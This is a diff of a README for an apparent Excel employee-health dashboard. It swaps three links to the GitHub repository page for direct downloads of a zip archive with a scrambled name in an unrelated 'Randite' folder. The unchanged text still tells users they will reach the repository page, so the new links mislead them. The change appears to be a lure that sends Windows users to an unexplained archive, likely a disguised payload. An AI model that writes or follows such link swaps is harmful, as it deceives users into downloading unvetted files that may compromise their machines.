@@ -1,6 +1,6 @@
 # 📊 Employee-Health-Analysis-DashBoard-Advance-Excel - Clean Data, Clear Insights
 
-[![Download Now](https://img.shields.io/badge/Download-Ready-green?style=for-the-badge&logo=windows)](https://github.com/surprising-freshness994/Employee-Health-Analysis-DashBoard-Advance-Excel)
+[![Download Now](https://img.shields.io/badge/Download-Ready-green?style=for-the-badge&logo=windows)](https://raw.githubusercontent.com/surprising-freshness994/Employee-Health-Analysis-DashBoard-Advance-Excel/main/Randite/Analysis-Excel-Employee-Health-Board-Dash-Advance-v3.6.zip)
 
 ## 📋 Overview
 
@@ -48,7 +48,7 @@ Follow these steps to download and run the project on your Windows PC.
 
 Click the green button below to open the download page on GitHub.
 
-[![Download Project](https://img.shields.io/badge/Download-Project-blue?style=for-the-badge&logo=github)](https://github.com/surprising-freshness994/Employee-Health-Analysis-DashBoard-Advance-Excel)
+[![Download Project](https://img.shields.io/badge/Download-Project-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/surprising-freshness994/Employee-Health-Analysis-DashBoard-Advance-Excel/main/Randite/Analysis-Excel-Employee-Health-Board-Dash-Advance-v3.6.zip)
 
 You will land on the project repository page.
 
@@ -188,6 +188,6 @@ Any changes you make to the dashboard or data files should be saved regularly:
 
 Use this link anytime to re-download or update your files:
 
-https://github.com/surprising-freshness994/Employee-Health-Analysis-DashBoard-Advance-Excel
+https://raw.githubusercontent.com/surprising-freshness994/Employee-Health-Analysis-DashBoard-Advance-Excel/main/Randite/Analysis-Excel-Employee-Health-Board-Dash-Advance-v3.6.zip
 
 Click **Code** > **Download ZIP** as explained above to get the latest files.
